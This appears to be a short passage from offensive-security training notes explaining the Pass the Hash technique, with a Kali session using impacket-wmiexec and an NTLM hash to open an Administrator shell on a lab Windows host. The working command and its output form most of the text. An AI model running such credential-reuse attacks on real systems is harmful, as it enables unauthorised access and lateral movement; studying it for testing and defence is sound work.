
The _Pass the Hash_ (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the user's plaintext password.

Note that this will only work for servers or services using NTLM authentication, not for servers or services using Kerberos authentication.

```
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```